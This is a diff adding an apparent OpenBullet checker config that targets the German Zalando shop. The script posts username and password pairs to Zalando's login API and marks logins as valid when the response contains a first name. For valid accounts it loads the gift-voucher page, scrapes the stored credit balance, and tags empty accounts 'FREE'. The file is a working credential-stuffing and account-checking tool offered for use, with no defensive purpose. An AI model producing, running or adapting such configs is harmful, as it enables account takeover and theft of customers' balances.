@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "builtwith",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-03T16:09:20.9444295+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.zalando.de/login" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+REQUEST POST "https://www.zalando.de/api/reef/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"wnaMode\":\"modal\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.zalando.de" 
+  HEADER "referer: https://www.zalando.de/" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "accept: application/json" 
+  HEADER "x-xsrf-token: <COOKIES(frsx)>" 
+  HEADER "x-zalando-client-id: <COOKIES(Zalando-Client-Id>" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "firstname" 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":false}" 
+REQUEST GET "https://www.zalando.de/benutzerkonto/geschenkgutscheine" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "XxeRjA WfGkDH oz0G06 HgyryE description\">Dein Zalando Guthaben: " "Â â‚¬</div></div></" -> CAP "Guthaben" "" "€" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "0,00" 
